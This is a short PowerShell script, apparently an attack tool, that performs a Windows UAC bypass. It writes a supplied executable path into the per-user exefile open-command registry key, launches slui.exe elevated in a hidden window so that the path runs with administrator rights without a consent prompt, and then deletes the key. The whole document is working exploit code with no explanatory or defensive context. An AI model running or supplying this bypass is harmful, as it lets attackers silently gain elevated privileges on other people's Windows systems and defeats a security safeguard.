Param(
  [Parameter(Mandatory=$True)][String]$ExePath
)

function Invoke-SluiBypass {
  [CmdletBinding()]
  param
  (
  [Parameter(Mandatory=$True,
  ValueFromPipeline=$True,
  ValueFromPipelineByPropertyName=$True)]
  [string]$Command
  )
  $RegRoot = 'HKCU:\Software\Classes\exefile\shell\open'
  $Name = 'command'
  $OldValue = $null

  if(Test-Path $RegRoot) {
    $OldValue = Get-Item "$RegRoot\$Name" -ErrorAction SilentlyContinue
  }
  New-Item -Path $RegRoot -Name $Name -Value $Command -Force | Out-Null
  Start-Process 'C:\Windows\System32\slui.exe' -Verb RunAs -WindowStyle Hidden
  Sleep 3
  Remove-Item -Path $RegRoot -Recurse
}

Invoke-SluiBypass -Command $ExePath
